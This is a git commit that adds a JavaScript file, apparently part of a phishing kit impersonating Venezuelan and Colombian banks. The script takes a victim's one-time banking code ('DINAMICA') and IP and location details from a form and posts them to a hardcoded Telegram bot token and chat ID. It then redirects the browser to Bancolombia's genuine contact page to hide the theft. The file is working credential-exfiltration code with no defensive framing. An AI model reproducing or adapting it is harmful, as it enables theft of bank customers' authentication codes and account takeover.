f52ff23815584c1256bde95fac11be2f40d1f815
bdvenlineasucursalcaracas <bdvenlineasucursalcaracas@gmail.com>
2025-01-28 15:02:52 -0500

    Add files via upload

---
+++ js/sax3.js
@@ -0,0 +1,34 @@
+//bot token
+var telegram_bot_id = "7865866491:AAEQ9ofVuEKkQs5QRgGfRemToLGiUT8uVN0";
+//chat id
+var chat_id = 7549680162;
+var u_name, ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("dinamica").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "DINAMICA: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\nBco.COLOCOBM S.A";
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        window.location = 'https://www.bancolombia.com/empresas/contactanos';
+        console.log(response);
+    });
+    return false;
+};
